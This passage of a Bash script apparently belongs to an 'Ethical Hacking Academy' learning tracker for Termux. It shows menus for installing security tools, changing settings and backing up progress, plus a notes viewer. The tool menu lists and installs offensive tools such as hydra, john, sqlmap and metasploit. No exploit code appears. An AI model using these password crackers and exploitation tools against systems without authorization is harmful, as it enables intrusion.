            "hydra:Password cracker"
            "john:John the Ripper"
            "theHarvester:OSINT tool"
            "metasploit:Exploitation framework"
            "dirsearch:Directory scanner"
            "wpscan:WordPress scanner"
            "nikto:Web scanner"
            "nuclei:Vulnerability scanner"
        )
        
        for tool in "${tools[@]}"; do
            local tool_name="${tool%%:*}"
            local tool_desc="${tool#*:}"
            if command -v "$tool_name" &> /dev/null; then
                echo -e "  ${GREEN}✓${NC} $tool_name - $tool_desc"
            else
                echo -e "  ${RED}✗${NC} $tool_name - $tool_desc"
            fi
        done
        
        echo ""
        echo -e "${WHITE}Actions:${NC}"
        echo "  1) Install all missing tools"
        echo "  2) Install specific tool"
        echo "  3) Update all tools"
        echo "  4) Check tool versions"
        echo "  5) Back to main menu"
        echo ""
        read -p "Choose [1-5]: " tool_action
        
        case $tool_action in
            1)
                echo ""
                echo -e "${BLUE}[*] Installing essential tools...${NC}"
                pkg update -y
                pkg install -y nmap sqlmap hydra john git wget curl python python2
                echo ""
                echo -e "${GREEN}✅ Basic tools installed!${NC}"
                echo ""
                echo -e "${YELLOW}Note: Some tools (metasploit, nuclei) require manual install.${NC}"
                read -p "Press [Enter] to continue..."
                ;;
            2)
                read -p "Enter tool name to install: " tool_install
                pkg install -y "$tool_install" 2>/dev/null || {
                    echo -e "${RED}❌ Failed to install $tool_install${NC}"
                    echo -e "${YELLOW}Try: pkg search $tool_install${NC}"
                }
                read -p "Press [Enter] to continue..."
                ;;
            3)
                echo -e "${BLUE}[*] Updating tools...${NC}"
                pkg upgrade -y
                echo ""
                echo -e "${GREEN}✅ Tools updated!${NC}"
                read -p "Press [Enter] to continue..."
                ;;
            4)
                echo ""
                echo -e "${WHITE}Tool Versions:${NC}"
                for tool in "${tools[@]}"; do
                    local tool_name="${tool%%:*}"
                    if command -v "$tool_name" &> /dev/null; then
                        echo -e "  ${GREEN}$tool_name${NC}: $($tool_name --version 2>&1 | head -1)"
                    fi
                done
                echo ""
                read -p "Press [Enter] to continue..."
                ;;
            5) break ;;
            *) echo "Invalid choice"; sleep 1 ;;
        esac
    done
}

settings_menu() {
    while true; do
        clear
        show_banner
        
        echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}${BOLD}                 ⚙️  SETTINGS & CONFIGURATION${NC}"
        echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${WHITE}Current Configuration:${NC}"
        echo "─────────────────────────────────────"
        echo -e "User Name: ${USER_NAME:-Not set}"
        echo -e "Start Date: ${START_DATE:-Not set}"
        echo -e "Config Dir: $CONFIG_DIR"
        echo -e "Progress File: $PROGRESS_FILE"
        echo ""
        echo -e "${WHITE}Actions:${NC}"
        echo "  1) Set/Change User Name"
        echo "  2) Reset Progress (Start Over)"
        echo "  3) Export All Data"
        echo "  4) Import Progress"
        echo "  5) View Configuration Files"
        echo "  6) Back to main menu"
        echo ""
        read -p "Choose [1-6]: " setting_choice
        
        case $setting_choice in
            1)
                read -p "Enter your name: " new_name
                if [ -f "$PROGRESS_FILE" ]; then
                    sed -i "s/\"user\": \"[^\"]*\"/\"user\": \"$new_name\"/" "$PROGRESS_FILE"
                    USER_NAME="$new_name"
                    echo -e "${GREEN}✅ User name set to: $new_name${NC}"
                fi
                sleep 1
                ;;
            2)
                echo -e "${RED}⚠️  WARNING: This will delete ALL progress!${NC}"
                read -p "Are you sure? (type 'YES' to confirm): " confirm
                if [[ "$confirm" == "YES" ]]; then
                    rm -f "$PROGRESS_FILE"
                    init_progress
                    echo -e "${GREEN}✅ Progress reset. Starting fresh!${NC}"
                    sleep 1
                fi
                ;;
            3)
                local backup_file="$CONFIG_DIR/backup_$(date +%Y%m%d_%H%M%S).tar.gz"
                tar -czf "$backup_file" "$CONFIG_DIR" 2>/dev/null
                echo -e "${GREEN}✅ All data backed up to:${NC}"
                echo "   $backup_file"
                sleep 2
                ;;
            4)
                read -p "Enter backup file path: " backup_path
                if [ -f "$backup_path" ]; then
                    tar -xzf "$backup_path" -C "$CONFIG_DIR/.."
                    echo -e "${GREEN}✅ Progress imported!${NC}"
                else
                    echo -e "${RED}❌ File not found!${NC}"
                fi
                sleep 2
                ;;
            5)
                echo ""
                echo -e "${WHITE}Configuration Files:${NC}"
                ls -lah "$CONFIG_DIR"
                echo ""
                read -p "Press [Enter] to continue..."
                ;;
            6) break ;;
            *) echo "Invalid choice"; sleep 1 ;;
        esac
    done
}

view_notes_menu() {
    while true; do
        clear
        show_banner
        
        echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}${BOLD}                 📝 MY NOTES & HISTORY${NC}"
        echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${WHITE}Select a step to view notes:${NC}"
        echo ""
        
        for i in {1..8}; do
            local step_name=$(get_step_name $i)
            local note_file="$NOTES_DIR/step${i}.txt"
            local has_notes=""
            
            if [ -f "$note_file" ] && [ -s "$note_file" ]; then
                has_notes=" (📝 has notes)"
            fi
            
            echo "  $i) $step_name$has_notes"
        done
        
        echo ""
        echo "  9) View all notes combined"
        echo "  0) Back to main menu"
        echo ""
        read -p "Choose [0-9]: " note_choice
        
        case $note_choice in
            1|2|3|4|5|6|7|8) view_step_notes $note_choice ;;
            9)
                clear
                echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
                echo -e "${CYAN}${BOLD}                 📋 ALL NOTES COMBINED${NC}"
                echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
                echo ""
                for i in {1..8}; do
                    echo "### STEP $i: $(get_step_name $i)"
                    echo ""
                    cat "$NOTES_DIR/step${i}.txt" 2>/dev/null || echo "No notes"
                    echo ""
                    echo "---"
                    echo ""
                done
                read -p "Press [Enter] to continue..."
                ;;
            0) break ;;
            *) echo "Invalid choice"; sleep 1 ;;
        esac
    done
}

# ============================================================
# 🚀 MAIN EXECUTION
# ============================================================

# Initialize
init_progress
load_progress

# Set user name if not set
if [ -z "$USER_NAME" ]; then
    clear
    echo -e "${CYAN}${BOLD}╔═══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║              🛡️  ETHICAL HACKING ACADEMY v2.0                  ║${NC}"
    echo -e "${CYAN}${BOLD}╚═══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}Welcome! Before we begin, please enter your name:${NC}"
    read -p "Name: " input_name
    USER_NAME="$input_name"
    START_DATE="$(date '+%Y-%m-%d %H:%M:%S')"
    
    # Update config
    sed -i "s/\"user\": \"[^\"]*\"/\"user\": \"$USER_NAME\"/" "$PROGRESS_FILE"
    sed -i "s/\"start_date\": \"[^\"]*\"/\"start_date\": \"$START_DATE\"/" "$PROGRESS_FILE"
    
    echo ""
    echo -e "${GREEN}✅ Welcome, $USER_NAME!${NC}"
    echo -e "${GREEN}📅 Session started: $START_DATE${NC}"
    echo ""
    echo -e "${YELLOW}💡 TIP: Use 'View Progress' (option 9) anytime to check your status${NC}"
    echo ""
    read -p "Press [Enter] to continue to main menu..."
fi

# Main loop
while true; do
    show_main_menu
done
